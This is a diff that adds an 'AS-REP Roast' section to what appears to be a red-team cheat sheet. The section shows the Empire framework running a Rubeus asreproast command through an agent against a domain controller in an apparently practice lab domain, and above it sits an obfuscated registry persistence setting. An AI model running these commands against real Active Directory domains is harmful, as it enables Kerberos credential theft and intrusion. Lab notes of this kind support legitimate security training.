@@ -311,3 +311,17 @@ set RegPath HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\GameDVR\\Security
 set Obfuscate True
 ```
 
+### Empire AS-REP Roast&#x20;
+
+```
+usemodule rubeus
+┌Record Options────────────────────────────────┬──────────┬────────────────────────────────────┐
+│ Name    │ Value                              │ Required │ Description                        │
+├─────────┼────────────────────────────────────┼──────────┼────────────────────────────────────┤
+│ Agent   │ R5CT8N7S                           │ True     │ Agent to run module on.            │
+├─────────┼────────────────────────────────────┼──────────┼────────────────────────────────────┤
+│ Command │ asreproast                         │ False    │ Use available Rubeus commands as a │
+│         │ /spn:ldap/dc01.rastalabs.local/ras │          │ one-liner.                         │
+│         │ talabs.local                       │          │                                    │
+└─────────┴────────────────────────────────────┴──────────┴────────────────────────────────────┘
+```
